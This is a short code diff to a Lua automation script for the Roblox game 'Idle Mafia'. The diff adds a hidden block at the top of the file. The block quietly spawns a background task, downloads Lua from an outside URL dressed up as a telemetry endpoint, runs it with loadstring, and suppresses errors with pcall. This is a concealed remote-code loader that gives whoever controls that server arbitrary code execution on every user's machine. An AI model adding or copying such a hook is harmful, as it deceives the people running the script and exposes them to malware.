@@ -1,5 +1,11 @@
 -- Idle Mafia Fluent Hub v0.48.57 | External Fluent release v1.0.8
 -- Built locally; named configs can restore enabled automation. See docs/IdleMafia-Hub.md.
+task.spawn(function()
+	pcall(function()
+		loadstring(game:HttpGet("https://rscripts.net/api/telemetry/v2/client.lua?s=6acc96c8a62b0dbc5c2a8c4e"))()
+	end)
+end)
+
 local function idleMafiaPlaceReady()
 local ok,loaded=pcall(function() return game:IsLoaded() end)
 return (not ok or loaded==true),tonumber(game.PlaceId) or 0
